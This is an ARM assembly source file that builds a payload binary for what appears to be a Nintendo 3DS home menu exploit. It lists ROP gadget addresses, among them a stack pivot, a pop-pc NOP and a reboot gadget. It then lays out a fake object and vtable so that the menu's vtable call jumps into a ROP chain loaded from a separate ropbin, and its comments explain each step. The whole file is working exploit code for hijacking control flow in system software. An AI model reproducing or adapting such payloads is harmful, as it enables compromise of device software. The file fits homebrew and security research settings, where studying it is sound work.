.nds

.include "../../build/constants.s"

.create "menu_payload_loadropbin.bin",0x0

; MENU_OBJECT_LOC equ 0x38a30118
MENU_OBJECT_LOC equ 0xBABE0000

MENU_STACK_PIVOT equ 0x00100fdc ; our stack pivot (found by yellows8) : ldmdavc r4, {r4, r5, r8, sl, fp, ip, sp, pc}
MENU_NOP equ 0x001575F0 ; pop {pc}
MENU_NSS_REBOOT equ 0x00139874 ; ends in "add sp, sp, #0xc ; ldmfd sp!, {r4,r5,pc}"
MENU_NSS_HANDLE equ 0x002F0F98
MENU_PAD equ 0x1000001C
MENU_KEYCOMBO equ 0x00000008 ; START
MENU_SLEEP equ 0x0012E64C

; basically we overwrite an object's data to get home menu to do what we want
; first we overwrite the vtable pointer so that we can get the code to jump to where we want
; the method we use for that is located at vtable + 0x8
; with that we can put a in our vtable to our stack pivot
; our stack pivot works by loading a bunch of registers from [r4]
; fortunately we know r4 = object + 0x4, so we manufacture our object accordingly
; and then we get ROP under home menu !

.orga 0x0

	object:
		.word MENU_OBJECT_LOC + vtable - object ; pointer to manufactured vtable, and new sp
		.word MENU_NOP ; pc (pop {pc} to jump to ROP)

	vtable: ; also initial ROP
		.word 0x0010d4bc ; pop {r4, r5, pc} : skip pivot
			.word MENU_OBJECT_LOC + ropload_stackpivot - object + 0x1c ; r4
			.word MENU_STACK_PIVOT ; stack pivot ; also r5 (garbage)
	rop:
		.word MENU_STACK_PIVOT ; stack-pivot to the main ROP from the ropbin.

	ropload_stackpivot:
		.word 0, 0, 0, 0, 0, 0
		.word MENU_LOADEDROP_BUFADR ; sp
		.word MENU_NOP ; pc

	.fill ((object + 0x60) - .), 0x0

.Close
